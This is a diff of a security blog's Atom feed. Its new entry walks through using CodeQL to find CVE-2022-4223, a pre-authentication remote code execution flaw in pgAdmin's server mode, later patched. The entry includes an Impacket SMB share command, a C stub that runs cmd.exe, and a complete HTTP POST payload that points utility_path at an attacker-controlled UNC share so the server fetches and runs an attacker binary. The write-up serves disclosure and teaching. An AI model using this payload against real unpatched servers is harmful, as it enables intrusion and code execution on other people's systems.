@@ -1,4 +1,167 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-26T23:28:46+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Frycos Security Diary</title><subtitle>Blogging mainly</subtitle><entry><title type="html">Skype for Business Audit Part 2 - SKYPErimeterleak</title><link href="http://localhost:4000/vulns4free/2022/09/26/skype-audit-part2.html" rel="alternate" type="text/html" title="Skype for Business Audit Part 2 - SKYPErimeterleak" /><published>2022-09-26T23:00:00+02:00</published><updated>2022-09-26T23:00:00+02:00</updated><id>http://localhost:4000/vulns4free/2022/09/26/skype-audit-part2</id><content type="html" xml:base="http://localhost:4000/vulns4free/2022/09/26/skype-audit-part2.html">&lt;p&gt;In my last &lt;a href=&quot;https://frycos.github.io/vulns4free/2022/09/22/skype-audit-part1.html&quot;&gt;blog post&lt;/a&gt; we talked about a new &lt;em&gt;persistence technique&lt;/em&gt; in &lt;strong&gt;Skype for Business 2019 (SfB)&lt;/strong&gt; found during my code audit. Now, I give a short code walk-through
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-12-02T12:37:59+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Frycos Security Diary</title><subtitle>Blogging mainly</subtitle><entry><title type="html">Pre-Auth RCE with CodeQL in Under 20 Minutes</title><link href="http://localhost:4000/vulns4free/2022/12/02/rce-in-20-minutes.html" rel="alternate" type="text/html" title="Pre-Auth RCE with CodeQL in Under 20 Minutes" /><published>2022-12-02T09:00:00+01:00</published><updated>2022-12-02T09:00:00+01:00</updated><id>http://localhost:4000/vulns4free/2022/12/02/rce-in-20-minutes</id><content type="html" xml:base="http://localhost:4000/vulns4free/2022/12/02/rce-in-20-minutes.html">&lt;p&gt;This write-up won’t be an intense discussion on security code review techniques this time.
+We’ll simply let do all the hard work by a third party: &lt;a href=&quot;https://codeql.github.com/&quot;&gt;CodeQL&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Our target? &lt;a href=&quot;https://www.pgadmin.org/&quot;&gt;pgAdmin&lt;/a&gt;. Or to be more precise, the &lt;strong&gt;web interface&lt;/strong&gt; if you run pgAdmin in &lt;em&gt;server mode&lt;/em&gt;. For the ones of you who don’t know pgAdmin yet, have a look at their website.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;pgAdmin is the most popular and feature rich Open Source administration and development platform for PostgreSQL, the most advanced Open Source database in the world.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This statement from their website is true, indeed. I used this tool already many years ago in my software development career path. But I didn’t know that it’s possible to run this “client” program in a kind of server mode. Maybe you’ve already seen these kinds of login screens somewhere?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/codeql/pgadminlogin.png&quot; alt=&quot;pgAdminLogin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is a nicely written &lt;a href=&quot;https://www.pgadmin.org/docs/pgadmin4/development/server_deployment.html&quot;&gt;introduction&lt;/a&gt; by the pgAdmin team on how to setup such a server quickly.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;pgAdmin may be deployed as a web application by configuring the app to run in server mode and then deploying it either behind a webserver running as a reverse proxy, or using the WSGI interface.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Alright then: we know how to setup this kind of thing and also that’s it’s quite common to find these on the &lt;a href=&quot;https://search.censys.io/search?resource=hosts&amp;amp;sort=RELEVANCE&amp;amp;per_page=25&amp;amp;virtual_hosts=EXCLUDE&amp;amp;q=services.http.response.html_title%3A%22pgAdmin+4%22&quot;&gt;public Internet&lt;/a&gt; (and Intranet I guess).&lt;/p&gt;
+
+&lt;p&gt;Since I’m looking at many different products on a daily basis at work, sometimes different approaches are needed to get a first idea on the degree of “resilience” with respect to vulnerability discovery. One of my many approaches takes into account &lt;em&gt;CodeQL&lt;/em&gt;, a “semantic code analysis engine”. I don’t want to try giving you a proper introduction into CodeQL (I don’t think I can) but rather give you a step-by-step tutorial on how this was used for attacking the pgAdmin code.&lt;/p&gt;
+
+&lt;p&gt;CodeQL needs a database containing the code in a structured format depending on the targeted language. For Java e.g. one has to let the CodeQL engine be part of your compilation process. Looking at the &lt;a href=&quot;https://github.com/pgadmin-org/pgadmin4&quot;&gt;pgAdmin GitHub&lt;/a&gt; project, we spot the main language being &lt;strong&gt;Python&lt;/strong&gt;. Luckily, CodeQL supports this language as well. Since &lt;a href=&quot;https://lgtm.com/&quot;&gt;https://lgtm.com/&lt;/a&gt; will be shut down this month, fetching ready-to-go CodeQL databases from this platform won’t be an option anymore. But good for us, the CodeQL team provides a ton of great documentation such as one for &lt;a href=&quot;https://codeql.github.com/docs/codeql-cli/creating-codeql-databases/&quot;&gt;creating such databases&lt;/a&gt;. I love to look at code with &lt;strong&gt;Visual Studio Code&lt;/strong&gt; which has a support for the CodeQL engine!&lt;/p&gt;
+
+&lt;p&gt;So let’s install the &lt;strong&gt;extension&lt;/strong&gt; first.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/codeql/vscodeql.png&quot; alt=&quot;vscodeextension&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A new button on the left side of your sidebar will appear named &lt;strong&gt;QL&lt;/strong&gt;. Next we fetch the latest version &lt;strong&gt;6.16&lt;/strong&gt; of pgAdmin (at the time of the vulnerability discovery) from the &lt;a href=&quot;https://github.com/pgadmin-org/pgadmin4/archive/refs/tags/REL-6_16.zip&quot;&gt;GitHub project&lt;/a&gt;. We immmediately recognize the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; directory with multiple Python files, part of the web application we’ll talk about later.&lt;/p&gt;
+
+&lt;p&gt;If your installation of the CodeQL extension finished properly, you’ll find the CodeQL CLI file at some location like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$HOME/.config/Code/User/globalStorage/github.vscode-codeql/distribution2/codeql/codeql&lt;/code&gt;. Executing this file will give you the help. Set an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alias&lt;/code&gt;, adjust your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bashrc&lt;/code&gt; or whatever fits your comfort needs.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Usage: codeql &amp;lt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &amp;lt;argument&amp;gt;...
+Create and query CodeQL databases, or work with the QL language.
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You’re all set to create your CodeQL database now!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;codeql database create pgadmincodeql &lt;span class=&quot;nt&quot;&gt;--language&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;python
+Initializing database at &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/pgAdmin/pgadmin4-REL-6_16/pgadmincodeql.
+Running build &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;
+...
+Finalizing database at &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/pgAdmin/pgadmin4-REL-6_16/pgadmincodeql.
+Successfully created database at &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/pgAdmin/pgadmin4-REL-6_16/pgadmincodeql
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And indeed the new directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pgadmincodeql&lt;/code&gt; was successfully created. Easy, wasn’t it? Now, we’ve to bring this database into our VS Code workspace using the QL menu.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/codeql/vscodeqlmenu.png&quot; alt=&quot;vscodeqlmenu&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Choose the newly created folder and the database will appear in VS Code magically. Then you’ve to set it as default by clicking on it until a grey mark is shown. You’re ready to use the database!&lt;/p&gt;
+
+&lt;p&gt;Before we can execute cool CodeQL queries, the gifts from the busy GitHub CodeQL team/community is needed. So clone the official &lt;a href=&quot;https://github.com/github/codeql&quot;&gt;CodeQL GitHub repository&lt;/a&gt; into your workspace.
+Ready to find the Pre-Auth Remote Code Execution (RCE) with just a few clicks?&lt;/p&gt;
+
+&lt;h1 id=&quot;find-the-flaw---codeql&quot;&gt;Find the flaw - CodeQL&lt;/h1&gt;
+
+&lt;p&gt;So I didn’t lie on finding the flaw in under 20 minutes. This included downloading the pgAdmin source, installing the VS Code extension, creating the CodeQL database, cloning the CodeQL GitHub repository and starting only one pre-built CodeQL query.&lt;/p&gt;
+
+&lt;p&gt;So, we imported the CodeQL database into our VS Code workspace. Now let’s get straight to the meat without even going to do any application mapping and other useful things typically expected during a security code review.&lt;/p&gt;
+
+&lt;p&gt;In the VS Code Explorer, the CodeQL GitHub project is visible and we drill down to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codeql/python/ql/src/Security&lt;/code&gt;. There you’ll find all the crazy stuff people did to provide intelligent queries against your database. We’re especially interested in queries which&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Allow to cover a lot of dangerous sinks at once.&lt;/li&gt;
+  &lt;li&gt;Include the tainted analyses spirit, i.e. instead of “just” showing potential dangerous sinks, also give us information if and how a sink can be reached from a reachable source.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codeql/python/ql/src/Security/CWE-020-ExternalAPIs/UntrustedDataToExternalAPI.ql&lt;/code&gt; will be a good start. Let’s try this by opening this file and then simply hit &lt;strong&gt;CodeQL: Run query&lt;/strong&gt;. This will take some time, grab a coffee…are you back? Let’s see what the result was.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/codeql/codeqlresult.png&quot; alt=&quot;codeqlresult&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Wow, that’s a lot of stuff! Since you might know me from former blog posts: I’m lazy, i.e. often searching for the most obvious attack path first.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess.getoutput( )&lt;/code&gt; sink perfectly matches my taste.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/codeql/attackpath.png&quot; alt=&quot;attackpath&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Indeed, CodeQL did a great job. It “realized” that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request&lt;/code&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flask&lt;/code&gt; Python library is used here. This is used all over the code to e.g. read from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request.data&lt;/code&gt; and doing stuff with it. Let’s have a closer look to the sink function.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/validate_binary_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                 &lt;span class=&quot;n&quot;&gt;endpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;validate_binary_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                 &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# [1]
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;validate_binary_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+    This function is used to validate the specified utilities path by
+    running the utilities with there versions.
+    &quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hasattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'decode'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;version_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'utility_path'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utility_path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# [2]
+&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# Check if &quot;$DIR&quot; present in binary path
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;binary_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;replace_binary_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utility_path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# [3]
+&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;utility&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UTILITIES_ARRAY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# [4]
+&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;full_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                             &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utility&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'nt'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+                              &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utility&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'.exe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# [5]
+&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;# Get the output of the '--version' command
+&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;version_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; \
+                    &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getoutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&quot;{0}&quot; --version'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;full_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# [6]
+&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;# Get the version number by splitting the result string
+&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;version_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;) &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At [1] the HTTP route handler is defined with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/validate_binary_path&lt;/code&gt; being the corresponding URI part to trigger the code. We expect this to come in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request.data&lt;/code&gt; is read and at [2] the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;utility_path&lt;/code&gt; POST body parameter is processed within an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt; block. We don’t really care about the function at [3], you might check yourself “why”.
+But at [4] a constant named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UTILITIES_ARRAY&lt;/code&gt; seems to heavily restrict our final input later flowing into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; call. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;constants.py&lt;/code&gt; tells us that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UTILITIES_ARRAY = ['pg_dump', 'pg_dumpall', 'pg_restore', 'psql']&lt;/code&gt;. Fine, but at [5] we still control the now named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binary_path&lt;/code&gt; variable, right? We control the &lt;strong&gt;path&lt;/strong&gt; but not the file name being executed in the dangerous final sink at [6]. Also you might have observed that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flask_login&lt;/code&gt; module provides a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@login_required&lt;/code&gt; annotation (check other routes of the web app) to check for an authenticated context. This is missing here, so we should at least be able to &lt;strong&gt;reach this route from an unauthenticated context&lt;/strong&gt;. You can indeed!&lt;/p&gt;
+
+&lt;p&gt;But you know, this is Python and the Server mode setup guide mentioned in the beginning also describes an installation on &lt;strong&gt;Windows&lt;/strong&gt;. I won’t go into a detailed step-by-step guide to install pgAdmin in Server mode on Windows because this took me over 3 hours and would make my blog post title obsolet *cough*.&lt;/p&gt;
+
+&lt;p&gt;If your patient enough, you could try to use your Python CLI on Windows to check what happens after using an &lt;strong&gt;UNC path to a remote share&lt;/strong&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.path.abspath(os.path.join(...))&lt;/code&gt; construct. Guess what, it will work as expected and the file would have been retrieved, read, called, whatever.&lt;/p&gt;
+
+&lt;p&gt;Let’s try this by setting up an SMB server on our Linux attacker machine using the famous &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py&quot;&gt;Impacket suite&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./smbserver.py myshare &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/tmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tmp&lt;/code&gt; directory I create a file named after a randomly chosen entry from the list &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UTILITIES_ARRAY&lt;/code&gt;, e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pg_dump[.exe]&lt;/code&gt;. Well, not totally random content, we want to do it right the first time. So let’s create an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.exe&lt;/code&gt; using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mingw&lt;/code&gt; cross-compiler and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pg_dump.c&lt;/code&gt; like this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void main() {
+ system(&quot;cmd.exe /K mspaint&quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST /misc/validate_binary_path HTTP/1.1&lt;/code&gt; should trigger the vulnerable code path. Depending on your pgAdmin Windows installation, you’ve to fetch a Cookie and CSRF-token first from either browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/login&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/browser&lt;/code&gt;. It’s possible for any installation type, so we just assume you were able to retrieve the content for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-pgA-CSRFToken&lt;/code&gt; header for now. The final payload looks like this.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /misc/validate_binary_path HTTP/1.1
+Host: [TARGETHOST]
+Cookie: [COOKIES_YOU_FETCHED_IN_ADVANCE]
+X-pgA-CSRFToken: [CSRF_TOKEN_YOU_FETCHED_IN_ADVANCE]
+Connection: close
+Referer: https://[TARGETHOST]/browser/
+Content-Length: [n]
+Content-Type: application/json
+{&quot;`utility_path&quot;:&quot;\\\\[ATTACKER_IP]\\[PREFERED_SHARE_NAME]&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After firing the payload, we see an incoming SMB connection at our attacker machine, retrieving the file(s) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pg_dump.exe&lt;/code&gt;: Pre-Auth RCE achieved.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/codeql/mspaint.png&quot; alt=&quot;RCE&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;patch&quot;&gt;Patch&lt;/h1&gt;
+
+&lt;p&gt;The pgAdmin team assigned &lt;strong&gt;CVE-2022-4223&lt;/strong&gt; and released a new version &lt;strong&gt;6.17&lt;/strong&gt; quickly. Kudos to them and their kind communication. I’m proud also that they now improved their disclosure process by adding more information on their GitHub project and also discuss the creation of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SECURITY.md&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/codeql/patch.png&quot; alt=&quot;Patch&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Alright, unauthenticated context for an attacker: killed. But in my opinion, the same exploit should still work from an authenticated context.&lt;/p&gt;
+
+&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
+
